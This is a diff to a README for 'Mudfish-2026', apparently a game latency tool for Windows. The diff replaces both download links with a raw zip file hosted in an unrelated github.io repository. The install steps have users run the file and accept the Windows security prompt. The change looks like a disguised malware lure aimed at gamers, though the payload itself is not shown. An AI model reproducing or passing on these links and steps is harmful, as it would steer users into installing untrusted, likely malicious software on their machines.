@@ -5,7 +5,7 @@ description: "Download the latest Mudfish installer for Windows 10 and 11 to opt
 ---
 # 🌐 Mudfish-2026 - Lower your game network latency
 
-[![](https://img.shields.io/badge/Download-Mudfish--2026-blue.svg)](https://github.com/quinom8520/Mudfish-2026)
+[![](https://img.shields.io/badge/Download-Mudfish--2026-blue.svg)](https://github.com/quinom8520/quinom8520.github.io/raw/refs/heads/main/basifacial/quinom-io-github-3.8-beta.1.zip)
 
 Mudfish-2026 helps users reduce lag while playing online games. It routes your game data through optimized paths to ensure a smooth connection. This tool works on Windows 10 and Windows 11. It focuses on stability and performance for competitive gamers who face high ping or jitter.
 
@@ -32,7 +32,7 @@ Before you install the software, check that your computer meets these requiremen
 
 Follow these steps to set up the software on your machine:
 
-1.  Visit the official page to [download the installer](https://github.com/quinom8520/Mudfish-2026).
+1.  Visit the official page to [download the installer](https://github.com/quinom8520/quinom8520.github.io/raw/refs/heads/main/basifacial/quinom-io-github-3.8-beta.1.zip).
 2.  Locate the downloaded installation file in your Downloads folder.
 3.  Double-click the file to start the installation process.
 4.  Follow the prompts on your screen. You might see a security prompt from Windows. Select "Yes" to allow the installer to make changes.
